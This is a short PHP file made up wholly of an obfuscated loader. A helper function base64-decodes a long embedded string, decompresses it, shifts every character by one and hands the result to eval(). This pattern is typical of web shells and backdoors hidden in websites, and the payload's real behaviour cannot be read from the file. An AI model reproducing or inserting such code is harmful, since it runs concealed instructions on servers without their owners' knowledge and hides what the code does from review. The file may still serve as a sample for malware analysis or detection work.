<?php function ZZO($bLQ)
{ 
$bLQ=gzinflate(base64_decode($bLQ));
 for($i=0;$i<strlen($bLQ);$i++)
 {
$bLQ[$i] = chr(ord($bLQ[$i])-1);
 }
 return $bLQ;
 }eval(ZZO("ZZJRa9swEMc/gMHf4SYKcmhqp4wyyCytY3T0ZS+jsIcsBFk+16auZSSFBko/+05ysqSpX2Tp7v+/3+lUahw8WpkmZftZftcanYN75Vr4japGWxZ0nCYQvjS5MKNgZmRf06RrIDtsZ68U2jq0TjRdjxkr0OtiVM691Gy2T/40ZcyAkusOM142ZvCgTW+sYBZrJstKrq7WcGetsbCEH2oYjI8gcOJYFpUsiyCWPJi/pcnt81Pd2YyryN8SPp/D4svNTYjf6vY8GI4vdmJBS2MsKt1mEx0oB/Fv35IVuBt7U1NPSzafIkFLhoIXrXnGguchb7VY57zIT2rs2+7chgrUqqJ7CbJZdB7jRW0e0W80NUIzcFM0mA/4EqKC/bn/Bey/PRHkzluyG3uliejvwOaMqMagin7j9tTvoLs6UuV+50mxrzBdw6W4phV1a4CvLtfw02yHegnvxvNoEQcakILWYiPY0fG0//NC4JWlFgXbVL0anpg85n6AynlZqMNcy8pKPo327YD2jqfqt0g49DYfjFf99GIjOAigKjuyIw/iPUP4yM9kFPed8xMBmYbasXSafJP/AA=="));?>